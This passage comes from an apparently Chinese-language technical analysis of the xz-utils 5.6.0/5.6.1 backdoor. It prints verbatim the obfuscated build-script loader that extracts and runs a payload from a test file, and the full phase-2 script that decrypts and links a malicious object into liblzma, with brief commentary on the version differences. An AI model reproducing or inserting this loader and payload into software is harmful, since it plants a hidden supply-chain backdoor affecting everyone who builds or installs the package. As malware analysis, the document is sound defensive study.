class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span></span><br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=`</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">###Hello####</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Z.hj</span><br>eval `grep ^srcdir= config.status`<br>if test -f ../../config.status;then<br>eval `grep ^srcdir= ../../config.status`<br>srcdir=&quot;../../$srcdir&quot;<br>fi<br>export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">###World####</span></span><br>`<br></code></pre></td></tr></table></figure><p><strong>5.6.1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span></span><br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=`</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">###Hello####</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">�$�</span><br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>eval `grep ^srcdir= config.status`<br>if test -f ../../config.status;then<br>eval `grep ^srcdir= ../../config.status`<br>srcdir=&quot;../../$srcdir&quot;<br>fi<br>export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr &quot;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">###World####</span></span><br>`<br></code></pre></td></tr></table></figure><p>這兩個版本的payload差不多，不過5.6.1版本會確認是否在Linux上編譯，而且確認了5次，可能是為了增加更改的量，讓commit看起來更正常</p><p>另一個不同的點是變數<code>i</code>的值不同，偏移量有所區別</p><p><code>i</code>的指令會丟棄前1024bytes，輸出2048bytes，再次丟棄前1024bytes，輸出2048bytes，這樣重複16次，最後丟棄前1024bytes，輸出724bytes(5.6.0)/939bytes(5.6.1)</p><p>後面的部分則是將第二個包含惡意Payload的測試檔案(<code>tests/files/good-large_compressed.lzma</code>)解壓縮，並對輸出執行<code>i</code>的指令，擷取尾部31265bytes(5.6.0)/31233bytes(5.6.1)，使用tr替換字元，再次進行一次解壓縮，得到phase2 payload，並將其執行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh<br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-364a092e" role="button" aria-expanded="false" aria-controls="collapse-364a092e">        <div class="fold-arrow">▶</div>phase2 payload      </div>      <div class="fold-collapse collapse" id="collapse-364a092e">        <div class="fold-content">          <p><a href="5.6.0-phase2-payload.txt"><strong>5.6.0-phase2-payload</strong></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><code class="hljs shell">P=&quot;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&quot;<br>C=&quot;pic_flag=\&quot; $P\&quot;&quot;<br>O=&quot;^pic_flag=\&quot; -fPIC -DPIC\&quot;$&quot;<br>R=&quot;is_arch_extension_supported&quot;<br>x=&quot;__get_cpuid(&quot;<br>p=&quot;good-large_compressed.lzma&quot;<br>U=&quot;bad-3-corrupt_lzma2.xz&quot;<br>eval $zrKcVq<br>if test -f config.status; then<br>eval $zrKcSS<br>eval `grep ^LD=\&#x27;\/ config.status`<br>eval `grep ^CC=\&#x27; config.status`<br>eval `grep ^GCC=\&#x27; config.status`<br>eval `grep ^srcdir=\&#x27; config.status`<br>eval `grep ^build=\&#x27;x86_64 config.status`<br>eval `grep ^enable_shared=\&#x27;yes\&#x27; config.status`<br>eval `grep ^enable_static=\&#x27; config.status`<br>eval `grep ^gl_path_map=\&#x27; config.status`<br>eval $zrKccj<br>if ! grep -qs &#x27;\[&quot;HAVE_FUNC_ATTRIBUTE_IFUNC&quot;\]=&quot; 1&quot;&#x27; config.status &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! grep -qs &#x27;define HAVE_FUNC_ATTRIBUTE_IFUNC 1&#x27; config.h &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if test &quot;x$enable_shared&quot; != &quot;xyes&quot;;then<br>exit 0<br>fi<br>if ! (echo &quot;$build&quot; | grep -Eq &quot;^x86_64&quot; &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo &quot;$build&quot; | grep -Eq &quot;linux-gnu$&quot; &gt; /dev/null 2&gt;&amp;1);then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R()&quot; $srcdir/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R()&quot; $srcdir/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R&quot; $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$x&quot; $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if test &quot;x$GCC&quot; != &#x27;xyes&#x27; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if test &quot;x$CC&quot; != &#x27;xgcc&#x27; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>LDv=$LD&quot; -v&quot;<br>if ! $LDv 2&gt;&amp;1 | grep -qs &#x27;GNU ld&#x27; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! test -f &quot;$srcdir/tests/files/$p&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! test -f &quot;$srcdir/tests/files/$U&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if test -f &quot;$srcdir/debian/rules&quot; || test &quot;x$RPM_ARCH&quot; = &quot;xx86_64&quot;;then<br>eval $zrKcst<br>j=&quot;^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4&quot;<br>if ! grep -qs &quot;$j&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>z=&quot;^am__uninstall_files_from_dir = &#123;&quot;<br>if ! grep -qs &quot;$z&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>w=&quot;^am__install_max =&quot;<br>if ! grep -qs &quot;$w&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>E=$z<br>if ! grep -qs &quot;$E&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>Q=&quot;^am__vpath_adj_setup =&quot;<br>if ! grep -qs &quot;$Q&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>M=&quot;^am__include = include&quot;<br>if ! grep -qs &quot;$M&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>L=&quot;^all: all-recursive$&quot;<br>if ! grep -qs &quot;$L&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>m=&quot;^LTLIBRARIES = \$(lib_LTLIBRARIES)&quot;<br>if ! grep -qs &quot;$m&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>u=&quot;AM_V_CCLD = \$(am__v_CCLD_\$(V))&quot;<br>if ! grep -qs &quot;$u&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! grep -qs &quot;$O&quot; libtool &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>eval $zrKcTy<br>b=&quot;am__test = $U&quot;<br>sed -i &quot;/$j/i$b&quot; src/liblzma/Makefile || true<br>d=`echo $gl_path_map | sed &#x27;s/\\\/\\\\\\\\/g&#x27;`<br>b=&quot;am__strip_prefix = $d&quot;<br>sed -i &quot;/$w/i$b&quot; src/liblzma/Makefile || true<br>b=&quot;am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)&quot;<br>sed -i &quot;/$E/i$b&quot; src/liblzma/Makefile || true<br>b=&quot;\$(top_srcdir)/tests/files/\$(am__test)&quot;<br>s=&quot;am__test_dir=$b&quot;<br>sed -i &quot;/$Q/i$s&quot; src/liblzma/Makefile || true<br>h=&quot;-Wl,--sort-section=name,-X&quot;<br>if ! echo &quot;$LDFLAGS&quot; | grep -qs -e &quot;-z,now&quot; -e &quot;-z -Wl,now&quot; &gt; /dev/null 2&gt;&amp;1;then<br>h=$h&quot;,-z,now&quot;<br>fi<br>j=&quot;liblzma_la_LDFLAGS += $h&quot;<br>sed -i &quot;/$L/i$j&quot; src/liblzma/Makefile || true<br>sed -i &quot;s/$O/$C/g&quot; libtool || true<br>k=&quot;AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))&quot;<br>sed -i &quot;s/$u/$k/&quot; src/liblzma/Makefile || true<br>l=&quot;LTDEPS=&#x27;\$(lib_LTDEPS)&#x27;; \\\\\n\<br>    export top_srcdir=&#x27;\$(top_srcdir)&#x27;; \\\\\n\<br>    export CC=&#x27;\$(CC)&#x27;; \\\\\n\<br>    export DEFS=&#x27;\$(DEFS)&#x27;; \\\\\n\<br>    export DEFAULT_INCLUDES=&#x27;\$(DEFAULT_INCLUDES)&#x27;; \\\\\n\<br>    export INCLUDES=&#x27;\$(INCLUDES)&#x27;; \\\\\n\<br>    export liblzma_la_CPPFLAGS=&#x27;\$(liblzma_la_CPPFLAGS)&#x27;; \\\\\n\<br>    export CPPFLAGS=&#x27;\$(CPPFLAGS)&#x27;; \\\\\n\<br>    export AM_CFLAGS=&#x27;\$(AM_CFLAGS)&#x27;; \\\\\n\<br>    export CFLAGS=&#x27;\$(CFLAGS)&#x27;; \\\\\n\<br>    export AM_V_CCLD=&#x27;\$(am__v_CCLD_\$(V))&#x27;; \\\\\n\<br>    export liblzma_la_LINK=&#x27;\$(liblzma_la_LINK)&#x27;; \\\\\n\<br>    export libdir=&#x27;\$(libdir)&#x27;; \\\\\n\<br>    export liblzma_la_OBJECTS=&#x27;\$(liblzma_la_OBJECTS)&#x27;; \\\\\n\<br>    export liblzma_la_LIBADD=&#x27;\$(liblzma_la_LIBADD)&#x27;; \\\\\n\<br>sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1&quot;;<br>sed -i &quot;/$m/i$l&quot; src/liblzma/Makefile || true<br>eval $zrKcHD<br>fi<br>elif (test -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (test -f .libs/liblzma_la-crc32_fast.o); then<br>eval $zrKcKQ<br>if ! grep -qs &quot;$R()&quot; $top_srcdir/src/liblzma/check/crc64_fast.c; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R()&quot; $top_srcdir/src/liblzma/check/crc32_fast.c; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R&quot; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$x&quot; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$C&quot; ../../libtool; then<br>exit 0<br>fi<br>if ! echo $liblzma_la_LINK | grep -qs -e &quot;-z,now&quot; -e &quot;-z -Wl,now&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if echo $liblzma_la_LINK | grep -qs -e &quot;lazy&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>N=0<br>W=0<br>Y=`grep &quot;dnl Convert it to C string syntax.&quot; $top_srcdir/m4/gettext.m4`<br>eval $zrKcjv<br>if test -z &quot;$Y&quot;; then<br>N=0<br>W=88792<br>else<br>N=88792<br>W=0<br>fi<br>xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed &quot;s/\(.\)/\1\n/g&quot; | LC_ALL=C awk &#x27;BEGIN&#123;FS=&quot;\n&quot;;RS=&quot;\n&quot;;ORS=&quot;&quot;;m=256;for(i=0;i&lt;m;i++)&#123;t[sprintf(&quot;x%c&quot;,i)]=i;c[i]=((i*7)+5)%m;&#125;i=0;j=0;for(l=0;l&lt;4096;l++)&#123;i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;&#125;&#125;&#123;v=t[&quot;x&quot; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &quot;%c&quot;,(v+k)%m&#125;&#x27; | xz -dc --single-stream | ((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o || true<br>if ! test -f liblzma_la-crc64-fast.o; then<br>exit 0<br>fi<br>cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true<br>V=&#x27;#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) &#123; int success = 1; uint32_t r[4]; success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19); return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; &#125;\n#else\n#define _is_arch_extension_supported is_arch_extension_supported&#x27;<br>eval $yosA<br>if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc64_fast.c | \<br>sed &quot;/include \&quot;crc_x86_clmul.h\&quot;/a \\$V&quot; | \<br>sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc64_fast.c\&quot;&quot; 2&gt;/dev/null | \<br><span class="hljs-meta prompt_">$</span><span class="language-bash">CC <span class="hljs-variable">$DEFS</span> <span class="hljs-variable">$DEFAULT_INCLUDES</span> <span class="hljs-variable">$INCLUDES</span> <span class="hljs-variable">$liblzma_la_CPPFLAGS</span> <span class="hljs-variable">$CPPFLAGS</span> <span class="hljs-variable">$AM_CFLAGS</span> <span class="hljs-variable">$CFLAGS</span> -r liblzma_la-crc64-fast.o -x c -  <span class="hljs-variable">$P</span> -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; <span class="hljs-keyword">then</span></span><br>cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true<br>eval $BPep<br>if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc32_fast.c | \<br>sed &quot;/include \&quot;crc32_arm64.h\&quot;/a \\$V&quot; | \<br>sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc32_fast.c\&quot;&quot; 2&gt;/dev/null | \<br><span class="hljs-meta prompt_">$</span><span class="language-bash">CC <span class="hljs-variable">$DEFS</span> <span class="hljs-variable">$DEFAULT_INCLUDES</span> <span class="hljs-variable">$INCLUDES</span> <span class="hljs-variable">$liblzma_la_CPPFLAGS</span> <span class="hljs-variable">$CPPFLAGS</span> <span class="hljs-variable">$AM_CFLAGS</span> <span class="hljs-variable">$CFLAGS</span> -r -x c -  <span class="hljs-variable">$P</span> -o .libs/liblzma_la-crc32_fast.o; <span class="hljs-keyword">then</span></span><br>eval $RgYB<br>if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then<br>if test ! -f .libs/liblzma.so; then<br>mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true<br>else<br>mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>rm -f .libs/liblzma_la-crc32-fast.o || true<br>rm -f .libs/liblzma_la-crc64-fast.o || true<br>else<br>mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>else<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>rm -f liblzma_la-crc64-fast.o || true<br>fi<br>eval $DHLd<br></code></pre></td></tr></table></figure><p><a href="5.6.1-phase2-payload.txt"><strong>5.6.1-phase2-payload</strong></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span 